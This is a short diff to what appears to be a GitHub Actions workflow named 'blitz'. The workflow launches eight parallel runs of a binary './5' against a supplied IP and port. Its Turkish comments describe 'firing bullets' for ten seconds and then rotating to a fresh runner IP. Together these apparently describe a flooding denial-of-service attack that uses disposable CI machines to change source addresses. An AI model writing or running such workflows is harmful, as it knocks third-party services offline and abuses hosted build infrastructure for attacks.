@@ -14,9 +14,6 @@ on:
         required: true
 
 
-on:
-  workflow_dispatch:
-
 jobs:
   blitz:
     runs-on: ubuntu-latest
@@ -43,6 +40,7 @@ jobs:
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..8}; do
             sudo timeout 10 ./5 "$IP" "$PORT" 500 1000 99999 "$TIME" &
+            PIDS+=($!)
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
